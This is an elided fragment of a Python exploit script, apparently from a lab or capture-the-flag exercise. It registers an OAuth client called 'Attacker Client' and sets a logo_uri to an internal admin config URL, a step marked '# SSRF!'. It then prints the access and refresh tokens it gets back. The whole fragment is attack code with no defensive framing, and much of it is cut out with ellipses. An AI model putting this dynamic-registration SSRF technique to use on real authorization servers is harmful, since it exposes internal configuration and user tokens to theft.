...
def main():
    ...
    print_info(f"SSRF Target: http://auth-server:8000/internal/admin/dev-config.json")

    register_data = {
        "client_name": "Attacker Client",
        "redirect_uris": [f"{BASE_URL}/auth/callback"],
        "logo_uri": "http://auth-server:8000/internal/admin/dev-config.json"  # SSRF!
    }
    ...
    try:
        ...
        if response.status_code == 200:
            ...
            print_success(f"Access Token: {access_token[:10000]}...")
            print_success(f"Refresh Token: {refresh_token[:10000]}...")
